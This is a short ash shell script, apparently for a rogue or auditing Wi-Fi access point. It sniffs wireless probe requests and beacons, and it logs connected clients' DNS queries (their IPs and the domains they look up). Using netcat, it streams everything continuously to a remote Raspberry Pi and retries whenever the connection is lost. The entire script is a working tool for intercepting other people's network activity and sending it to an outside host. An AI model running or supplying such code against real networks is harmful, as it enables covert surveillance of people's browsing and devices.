#!/bin/ash

# Target Raspberry Pi IP and port
PI_IP="IP OF EXTRA BRAINS HERE"
PI_PORT="PORT OF EXTRA BRAINS HERE"

# Interfaces to monitor
MONITOR_INTERFACE="MONITOR_INTERFACE"
AP_INTERFACE="AP_INTERFACE"

# Function to capture probes and beacons from mon0
capture_probes_and_beacons() {
    tcpdump -l -i "$MONITOR_INTERFACE" type mgt -n -tt 2>/dev/null | while read -r line; do
        if echo "$line" | grep -q "Probe Request"; then
            echo "$line" 
        elif echo "$line" | grep -q "Beacon"; then
            echo "$line"
        fi
    done
}

# Function to capture traffic
capture_karen_traffic() {
    tcpdump -l -i "$AP_INTERFACE" port 53 -n -tt 2>/dev/null | while read -r line; do
        if echo "$line" | grep -q "IP"; then
            src_ip=$(echo "$line" | awk '{print $3}')
            dest_ip=$(echo "$line" | awk '{print $5}' | tr -d ':')
            domain=$(echo "$line" | awk -F' ' '{for(i=1;i<=NF;i++) if($i ~ /A\?|AAAA\?|HTTPS\?/) print $(i+1)}' | sed 's/\.$//')
            size=$(echo "$line" | awk '{print $NF}')
            echo "DNS_QUERY: $src_ip -> $dest_ip, Domain: $domain, Size: ${size}B"
        else
            echo "$line"
        fi
    done
}

# Function to send logs persistently
send_logs() {
    while true; do
        echo "Starting log transmission to $PI_IP:$PI_PORT..."
        {
            capture_probes_and_beacons &
            capture_karen_traffic &
            wait
        } | nc "$PI_IP" "$PI_PORT"
        echo "Connection lost. Retrying in 5 seconds..."
        sleep 5
    done
}

# Start sending logs
send_logs
